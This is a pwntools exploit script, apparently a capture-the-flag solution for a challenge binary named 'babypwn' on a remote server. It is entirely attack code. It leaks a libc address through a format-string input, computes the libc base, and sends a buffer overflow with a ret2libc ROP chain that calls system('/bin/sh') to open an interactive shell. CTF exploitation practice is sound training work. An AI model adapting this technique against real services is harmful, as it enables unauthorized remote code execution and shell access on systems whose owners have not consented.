from pwn import *

elf = ELF("babypwn_patched")
libc = ELF("libc.so.6")
#p = elf.process()
p = remote("be.ax", 31801)
raw_input("DEBUG")


p.sendlineafter("What is your name?\n", b"%2$p")
p.recvuntil("Hi, ")

leak = int(p.recvuntil("\n",drop= True),16)
libc.address = leak + 0x1440
log.success("LIBC BASE: "+hex(libc.address))

pop_rdi = libc.address + 0x0000000000023b6a
bin_sh = next(libc.search(b'/bin/sh'))
ret = libc.address + 0x0000000000022679

payload = b"A"*96
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(libc.sym.system)


p.sendlineafter("What's your favorite :msfrog: emote?\n", payload)

p.interactive()
